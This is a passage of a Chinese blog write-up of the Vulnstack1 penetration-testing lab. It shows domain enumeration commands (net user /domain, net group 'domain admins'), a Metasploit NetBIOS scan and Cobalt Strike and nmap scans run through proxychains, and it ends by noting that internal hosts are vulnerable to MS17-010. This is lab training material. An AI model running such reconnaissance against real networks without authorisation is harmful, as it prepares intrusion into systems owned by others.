+<p><code>net config workstation</code><font style="color:rgb(77, 77, 77);">查询当前的登录域与用户信息(这里需要使用域用户，既未提权之前的用户)</font></p>
+<p><font style="color:rgb(77, 77, 77);">这里由于提了权,执行失败,换了个administrator的域用户</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53.png"
+	width="797"
+	height="326"
+	srcset="/shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53_hu7b4a0be95b72244c52e3f5be94f0a8b6_94440_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721112861141-c158a69f-4fe1-4bb4-9de8-a463d99e7a53_hu7b4a0be95b72244c52e3f5be94f0a8b6_94440_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
+	
+></p>
+<p><code>nslookup god.org</code><font style="color:rgb(77, 77, 77);">利用 nslookup 命令直接解析域名服务器</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad.png"
+	width="368"
+	height="155"
+	srcset="/shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad_hu7b40b213791ae256a59fe665c7d06e85_41600_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721112934717-dbfbfd82-3241-4131-ae11-8af411365fad_hu7b40b213791ae256a59fe665c7d06e85_41600_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="237"
+		data-flex-basis="569px"
+	
+></p>
+<p><code>net user /domain</code><font style="color:rgb(77, 77, 77);">查看当前域的所有用户</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae.png"
+	width="744"
+	height="300"
+	srcset="/shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae_hu0778f3ca9d53a574e02246e6341b1d3e_77680_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721113172766-9dc49a2c-1887-4227-9ed7-16714178e0ae_hu0778f3ca9d53a574e02246e6341b1d3e_77680_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p><code>wmic useraccount get /all</code><font style="color:rgb(77, 77, 77);">获取域内用户的详细信息,可以获取到用户名，描述信息，SID 域名等</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3.png"
+	width="1636"
+	height="324"
+	srcset="/shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3_hudf08e45b524becc3b8812bf5435a3430_240479_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721113409045-1f4e767b-e9df-43c6-adf2-bb0cfc4669d3_hudf08e45b524becc3b8812bf5435a3430_240479_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="504"
+		data-flex-basis="1211px"
+	
+></p>
+<p><code>net group &quot;domain computers&quot; /domain</code><font style="color:rgb(77, 77, 77);">查看所有域成员计算机列表</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb.png"
+	width="954"
+	height="318"
+	srcset="/shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb_huc8be34ae8015b5dad1290530abadf260_87565_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721113499402-3276a3b0-c48b-4a0d-bef8-b062058e6ccb_huc8be34ae8015b5dad1290530abadf260_87565_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="720px"
+	
+></p>
+<p><code>net group &quot;domain admins&quot; /domain</code><font style="color:rgb(77, 77, 77);">查看域管理员</font></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421.png"
+	width="857"
+	height="313"
+	srcset="/shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421_hu56ec671444bcc5dddc3e14514979b158_77541_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721113607752-484f6148-4e56-4d41-a10f-98fe63d0d421_hu56ec671444bcc5dddc3e14514979b158_77541_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="657px"
+	
+></p>
+<h3 id="横向探测">横向探测
+</h3><h4 id="扫主机">扫主机
+</h4><h5 id="font-stylecolorrgb77-77-77msffont"><font style="color:rgb(77, 77, 77);">msf</font>
+</h5><p><font style="color:rgb(77, 77, 77);">proxychains4只支持支持socks，http, https协议，它们都是以tcp或者udp协议为基础，而 ping用的是ICMP协议，所以使用</font><code>nmap -sn</code><font style="color:rgb(77, 77, 77);">是无法扫出来的，可以使用udp和tcp协议扫</font></p>
+<p><font style="color:rgb(77, 77, 77);">使用</font><code>nbname</code><font style="color:rgb(77, 77, 77);">探测模块</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/netbios/nbname
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rhost 192.168.52.0/24
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="cs">cs
+</h5><p><img src="/shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc.png"
+	width="624"
+	height="181"
+	srcset="/shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc_hu8c03bcba2878055701f5b8f21efaea56_52492_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721115966757-548349de-0e79-4d7d-aff9-3dbea4dc97fc_hu8c03bcba2878055701f5b8f21efaea56_52492_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="344"
+		data-flex-basis="827px"
+	
+></p>
+<p>138和141刚好就是另外两台内网ip</p>
+<p>或者port scan有arp扫描主机</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a.png"
+	width="985"
+	height="465"
+	srcset="/shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a_hu057929c52539af832bf1c169f307e44f_143958_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721116091308-d7badcee-3ac7-4934-94c2-fa86179cb34a_hu057929c52539af832bf1c169f307e44f_143958_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="508px"
+	
+></p>
+<p>选择内网的网段</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0.png"
+	width="526"
+	height="119"
+	srcset="/shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0_hua17538cab7317a211213efeb2a450639_23613_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721116531548-29dc7cc0-b699-4854-9f3b-f3cafb8242d0_hua17538cab7317a211213efeb2a450639_23613_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="442"
+		data-flex-basis="1060px"
+	
+></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410.png"
+	width="687"
+	height="112"
+	srcset="/shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410_hue19a7b219a3b2fdc8e673cc0f689dc09_41296_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721116615008-a6420a47-31a7-4344-8dd4-37fba0a5e410_hue19a7b219a3b2fdc8e673cc0f689dc09_41296_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="613"
+		data-flex-basis="1472px"
+	
+></p>
+<p>三台主机的内网ip都出来了</p>
+<h4 id="扫端口">扫端口
+</h4><h5 id="cs-1">cs
+</h5><p><code>nmap -sC -sV -p 1-1000 ip</code></p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b.png"
+	width="643"
+	height="314"
+	srcset="/shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b_hu1a01a7a18714023b5d128e80a9fed27a_116839_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721119739795-e62099e8-3ddc-4217-b7bd-7cdca77e9f3b_hu1a01a7a18714023b5d128e80a9fed27a_116839_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="491px"
+	
+></p>
+<h5 id="nmap">nmap
+</h5><p>注意:这里用<code>proxychains</code>用proxychains4没用</p>
+<p><img src="/shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598.png"
+	width="959"
+	height="251"
+	srcset="/shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598_hu3ceeabba79dbe63d1682b24e4ab5be84_234763_480x0_resize_box_3.png 480w, /shentou/vulnstack/vulnstack1/1721121882248-491eba34-4d0e-4616-9915-ffe93baff598_hu3ceeabba79dbe63d1682b24e4ab5be84_234763_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="916px"
+	
+></p>
+<p>后面两个就内网的机子都是有ms17的漏洞</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 03, 2025 15:27 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnstack/vulnstack2/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnstack/vulnstack2/15.f109e0b68284185c2379a910c83e65e4_hu85a8d744ab8dd95322370522d1a3e8dc_132814_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnstack2"
+                        
+                        data-hash="md5-8QngtoKEGFwjeakQyD5l5A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vulnstack2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/w1e3s/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/w1e3s/13.77123a0ce38008492538c1bc99b49322_hu5b08183bff39717ce68447d69c09704d_736555_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post W1e3s"
+                        
+                        data-hash="md5-dxI6DOOACEklOMG8mbSTIg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">W1e3s</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/vulnix/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/vulnix/12.f1ce5bf1f8047340847989621ce88075_hu5edc2dee25930f45c5f3558e9b5d8e2d_471588_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Vulnix"
+                        
+                        data-hash="md5-8c5b8fgEc0CEeYliHOiAdQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vulnix</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/tr0ll/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/tr0ll/11.fa5687c30ba60a30dcf48db65f9ce7de_hu55c6e0bf4da1ddb34f779c438d682c63_464230_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Tr0ll"
+                        
+                        data-hash="md5-&#43;laHwwumCjDc9I22X5zn3g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tr0ll</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/shentou/vulnhub/raven/">
+        
+        
+            <div class="article-image">
+                <img src="/shentou/vulnhub/raven/10.cdd7da0c250b77825d94fa2147947414_huc584c10ae1fdf6b10c758655cf22572c_334424_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Raven"
+                        
+                        data-hash="md5-zdfaDCULd4JdlPohR5R0FA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Raven</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 一个俗人
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  @font-face {
+    font-family: '屏显臻宋';
+    src: url(https://gsygsr.github.io/font/%E5%B1%8F%E6%98%BE%E8%87%BB%E5%AE%8B.ttf) format('truetype');
+  }
+
+  :root {
+    --base-font-family: '屏显臻宋';
+    --code-font-family: '屏显臻宋';
+  }
+  body {
+    background: url(https://gsygsr.github.io/background/58.jpg) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+    </body>
+</html>
